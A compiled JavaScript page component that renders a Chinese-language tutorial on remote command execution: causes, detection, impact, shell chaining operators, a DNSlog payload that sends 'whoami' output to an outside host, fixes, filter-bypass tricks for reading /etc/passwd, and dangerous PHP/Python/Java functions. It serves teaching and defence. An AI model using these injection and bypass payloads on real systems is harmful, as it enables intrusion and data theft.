import{_ as s,W as d,X as r,Y as t,Z as a,a0 as n,a1 as e,C as i}from"./framework-b6a07282.js";const o={},h=e('<h2 id="远程代码执行" tabindex="-1"><a class="header-anchor" href="#远程代码执行" aria-hidden="true">#</a> 远程代码执行</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><ul><li>RCE;叫远程代码执行（<strong>R</strong>emote <strong>C</strong>ode <strong>E</strong>xecute）或远程命令执行（<strong>R</strong>emote <strong>C</strong>ommand <strong>E</strong>xecute）</li><li>由于程序中预留了执行代码或者命令的接口，并且提供了给用户使用的界面。攻击者可以通过此接口执行相应的代码或命令来获取信息或控制该主机。</li></ul><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><ul><li>服务器端没有对用户输入的数据进行合理的过滤或验证，导致攻击者可以利用某些函数或接口来执行任意代码或命令。</li><li>服务器端使用了存在缺陷的组件或库，导致攻击者可以利用组件或库中的漏洞来执行任意代码或命令。</li><li>服务器端没有对网络协议进行正确的处理，导致攻击者可以利用协议中的漏洞来执行任意代码或命令。</li></ul><h3 id="_3-如何发现是否存在这个漏洞" tabindex="-1"><a class="header-anchor" href="#_3-如何发现是否存在这个漏洞" aria-hidden="true">#</a> 3.如何发现是否存在这个漏洞？</h3><ul><li>远程代码执行漏洞通常出现在一些需要给用户提供远程命令操作接口的应用系统中，比如路由器、防火墙、入侵检测等设备的web管理界面。里面有测试网络连接的模块，其中可以执行ping、telnet、nslookup等命令。</li><li>输入系统命令，是否会被执行。如：whoami</li></ul><h3 id="_4-该漏洞会造成什么危害" tabindex="-1"><a class="header-anchor" href="#_4-该漏洞会造成什么危害" aria-hidden="true">#</a> 4.该漏洞会造成什么危害？</h3><ol><li>攻击者可以在服务器上执行任意代码或命令，从而控制或破坏服务器的功能和数据。 如：获取服务器权限、获取敏感数据文件、写入恶意文件getshell、植入木马病毒勒索软件</li><li>攻击者可以利用服务器作为跳板，进一步攻击内部网络中的其他设备或系统。</li><li>攻击者可以利用服务器获取敏感信息，例如用户账号、密码、隐私数据等。</li></ol><h3 id="_5-如何利用这个漏洞" tabindex="-1"><a class="header-anchor" href="#_5-如何利用这个漏洞" aria-hidden="true">#</a> 5.如何利用这个漏洞？</h3><h4 id="命令拼接符号" tabindex="-1"><a class="header-anchor" href="#命令拼接符号" aria-hidden="true">#</a> 命令拼接符号</h4>',11),c=t("thead",null,[t("tr",null,[t("th",null,"符号"),t("th",null,"含义"),t("th",null,"示例")])],-1),u=t("tr",null,[t("td",null,"Windwos"),t("td"),t("td")],-1),p=t("tr",null,[t("td",null,"&&"),t("td",null,"左边的命令执行成功，右边的才执行"),t("td",null,"ping 127.0.0.1 && echo 'hello'")],-1),m=t("tr",null,[t("td",null,"&"),t("td",null,"简单的拼接"),t("td",null,"ping 1111 & echo 'hello'")],-1),_=t("tr",null,[t("td",null,"|"),t("td",null,"上一条命令的输出，作为下一条命令参数"),t("td",null,"netstat -ano | findstr 3306")],-1),b=t("td",null,"||",-1),g=t("td",null,"左边的命令执行失败，右边的才执行",-1),x={href:"http://baidu.com",target:"_blank",rel:"noopener noreferrer"},f={href:"http://baidu.net",target:"_blank",rel:"noopener noreferrer"},k=t("tr",null,[t("td",null,"Linux"),t("td"),t("td")],-1),v=t("tr",null,[t("td",null,"&&"),t("td",null,"左边的命令执行成功，右边的才执行"),t("td",null,"ping 127.0.0.1 && echo 'hello'")],-1),w=t("tr",null,[t("td",null,"|"),t("td",null,"上一条命令的输出，作为下一条命令参数"),t("td",null,"netstat -ano")],-1),y=t("td",null,"||",-1),j=t("td",null,"左边的命令执行失败，右边的才执行",-1),I={href:"http://baidu.com",target:"_blank",rel:"noopener noreferrer"},M=t("tr",null,[t("td",null,";"),t("td",null,"没有任何逻辑关系的连接符"),t("td")],-1),S=t("tr",null,[t("td",null,"&"),t("td",null,"任务后台执行，与nohup命令功能差不多"),t("td",null,"java -jar test.jar > log.txt &")],-1),E=t("tr",null,[t("td",null,"其他"),t("td"),t("td")],-1),F=t("tr",null,[t("td",null,"%0a"),t("td",null,"换行"),t("td",null,"cmd1 %0a cmd2")],-1),$=e(`<h4 id="常见的注入方式" tabindex="-1"><a class="header-anchor" href="#常见的注入方式" aria-hidden="true">#</a> 常见的注入方式</h4><ul><li>分号分割</li><li>|| &amp;&amp; &amp; 分割</li><li>| 管道符</li><li>\\r\\n %d0%a0 换行</li><li>反引号解析</li><li>$() 替换</li></ul><h4 id="无回显利用dnslog" tabindex="-1"><a class="header-anchor" href="#无回显利用dnslog" aria-hidden="true">#</a> 无回显利用dnslog</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token function">curl</span> <span class="token string">&#39;whoami&#39;</span>.DNSlog地址 <span class="token parameter variable">-c</span> <span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="_6-如何修复-防御这个漏洞" tabindex="-1"><a class="header-anchor" href="#_6-如何修复-防御这个漏洞" aria-hidden="true">#</a> 6.如何修复/防御这个漏洞？</h3><ol><li><p>不使用或禁用危险函数</p></li><li><p>尽量不要执行外部的应用程序或命令</p></li><li><p>如果必须使用，需要做白名单处理</p></li><li><p>使用正则表达对用户输入的内容进行处理</p></li><li><p>转义命令中的所有shell元字符</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code> shell元字符包括 <span class="token comment">#&amp;;,|*?~&lt;&gt;^()[]{}$\\\`</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li><li><p>使用防火墙、WAF、入侵检测等安全设备，拦截和识别恶意的请求或响应。</p></li><li><p>限制服务器的权限和网络访问，避免攻击者获取过高的权限或扩大影响范围。</p></li></ol><h3 id="_7-在有防御措施的情况下-如何绕过防御" tabindex="-1"><a class="header-anchor" href="#_7-在有防御措施的情况下-如何绕过防御" aria-hidden="true">#</a> 7.在有防御措施的情况下，如何绕过防御？</h3><h4 id="空格绕过" tabindex="-1"><a class="header-anchor" href="#空格绕过" aria-hidden="true">#</a> 空格绕过</h4>`,8),C=t("ul",null,[t("li",null,"< 符号 cat<123"),t("li",null,"\\t / %09"),t("li",null,[t("span",{class:"katex"},[t("span",{class:"katex-mathml"},[t("math",{xmlns:"http://www.w3.org/1998/Math/MathML"},[t("semantics",null,[t("mrow",null,[t("mrow",null,[t("mi",null,"I"),t("mi",null,"F"),t("mi",null,"S")]),t("mtext",null,"其中"),t("mrow"),t("mtext",null,"用来截断，比如"),t("mi",null,"c"),t("mi",null,"a"),t("mi",null,"t")]),t("annotation",{encoding:"application/x-tex"},"{IFS} 其中{}用来截断，比如cat")])])]),t("span",{class:"katex-html","aria-hidden":"true"},[t("span",{class:"base"},[t("span",{class:"strut",style:{height:"0.6833em"}}),t("span",{class:"mord"},[t("span",{class:"mord mathnormal",style:{"margin-right":"0.07847em"}},"I"),t("span",{class:"mord mathnormal",style:{"margin-right":"0.05764em"}},"FS")]),t("span",{class:"mord cjk_fallback"},"其中"),t("span",{class:"mord"}),t("span",{class:"mord cjk_fallback"},"用来截断，比如"),t("span",{class:"mord mathnormal"},"c"),t("span",{class:"mord mathnormal"},"a"),t("span",{class:"mord mathnormal"},"t")])])]),a("IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串")])],-1),L=t("h4",{id:"黑名单绕过",tabindex:"-1"},[t("a",{class:"header-anchor",href:"#黑名单绕过","aria-hidden":"true"},"#"),a(" 黑名单绕过")],-1),N=t("ul",null,[t("li",null,[t("strong",null,[a("a=l;b=s;"),t("span",{class:"katex"},[t("span",{class:"katex-mathml"},[t("math",{xmlns:"http://www.w3.org/1998/Math/MathML"},[t("semantics",null,[t("mrow",null,[t("mi",null,"a")]),t("annotation",{encoding:"application/x-tex"},"a")])])]),t("span",{class:"katex-html","aria-hidden":"true"},[t("span",{class:"base"},[t("span",{class:"strut",style:{height:"0.4306em"}}),t("span",{class:"mord mathnormal"},"a")])])]),a("b")])]),t("li",null,[a("base64 "),t("strong",null,'echo "bHM=" | base64 -d')]),t("li",null,[t("strong",null,"/?in/?s"),a(" => "),t("strong",null,"/bin/ls")]),t("li",null,[a("连接符 "),t("strong",null,"cat /etc/pass'w'd")]),t("li",null,[a("未定义的初始化变量 "),t("strong",null,"cat$x /etc/passwd")]),t("li",null,"使用Base64编码")],-1),P=e('<h3 id="常见的危险函数" tabindex="-1"><a class="header-anchor" href="#常见的危险函数" aria-hidden="true">#</a> 常见的危险函数</h3><h4 id="php" tabindex="-1"><a class="header-anchor" href="#php" aria-hidden="true">#</a> PHP</h4><h5 id="命令command注入" tabindex="-1"><a class="header-anchor" href="#命令command注入" aria-hidden="true">#</a> 命令command注入</h5><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>system()</td><td>执行外部程序，并且显示输出</td></tr><tr><td>exec()/shell_exec()</td><td>通过shell环境执行命令，并且将完整的输出以字符串的方式返回</td></tr><tr><td>pcntl_exec()</td><td>在当前进程空间执行指定程序</td></tr><tr><td>passthru()</td><td>执行外部程序并且显示原始输出</td></tr><tr><td>popen()</td><td>打开进程文件指针</td></tr><tr><td>proc_open()</td><td>执行一个命令，并且打开用来输入/输出的文件指针</td></tr></tbody></table><h5 id="代码code注入" tabindex="-1"><a class="header-anchor" href="#代码code注入" aria-hidden="true">#</a> 代码code注入</h5><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>eval()</td><td>把字符串code作为PHP代码执行</td></tr><tr><td>assert()</td><td>检查一个断言是否为false</td></tr><tr><td>preg_replace()</td><td>执行一个正则表达式的搜索和替换</td></tr><tr><td>create_function()</td><td>创建一个匿名函数并且返回函数名称</td></tr><tr><td>call_user_func()/ca ll_user_func_array()</td><td>把第一个参数作为回调函数调用</td></tr><tr><td>usort()/uasort()</td><td>使用用户自定义的比较函数对数组中的值 进行排序并保持索引关联</td></tr></tbody></table><h4 id="python" tabindex="-1"><a class="header-anchor" href="#python" aria-hidden="true">#</a> Python</h4><ul><li>system</li><li>popen</li><li>subprocess.call</li><li>spawn</li></ul><h4 id="java" tabindex="-1"><a class="header-anchor" href="#java" aria-hidden="true">#</a> Java</h4><ul><li>java.lang.Runtime.getRuntime().exec(command)</li></ul>',10);function R(B,V){const l=i("ExternalLinkIcon");return d(),r("div",null,[h,t("table",null,[c,t("tbody",null,[u,p,m,_,t("tr",null,[b,g,t("td",null,[a("ping "),t("a",x,[a("baidu.com"),n(l)]),a(" || ping "),t("a",f,[a("baidu.net"),n(l)])])]),k,v,w,t("tr",null,[y,j,t("td",null,[a("ping "),t("a",I,[a("baidu.com"),n(l)])])]),M,S,E,F])]),$,C,L,N,P])}const W=s(o,[["render",R],["__file","远程代码执行.html.vue"]]);export{W as default};
